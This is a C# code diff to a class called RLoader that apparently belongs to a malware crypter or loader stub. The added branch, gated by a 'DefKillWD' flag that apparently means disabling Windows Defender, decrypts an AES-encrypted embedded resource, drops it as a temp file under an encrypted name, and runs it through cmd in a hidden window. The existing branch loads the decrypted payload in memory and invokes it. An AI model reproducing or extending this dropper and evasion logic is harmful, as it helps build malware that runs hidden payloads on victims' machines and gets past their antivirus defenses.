@@ -8,7 +8,6 @@ using System.Resources;
 using System.Threading;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Linq;
 #if DefDebug
 using System.Windows.Forms;
 #endif
@@ -64,7 +63,20 @@ public partial class RLoader
 
         try
         {
+#if DefKillWD
+            string fn = Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE"))));
+            File.WriteAllBytes(fn, RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")));
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd",
+                Arguments = "/c " + fn + " \"" + Assembly.GetEntryAssembly().Location + "\"",
+                WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+            });
+#else
             Assembly.Load(RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program"))).EntryPoint.Invoke(null, new object[0]);
+#endif        
         }
         catch (Exception ex)
         {
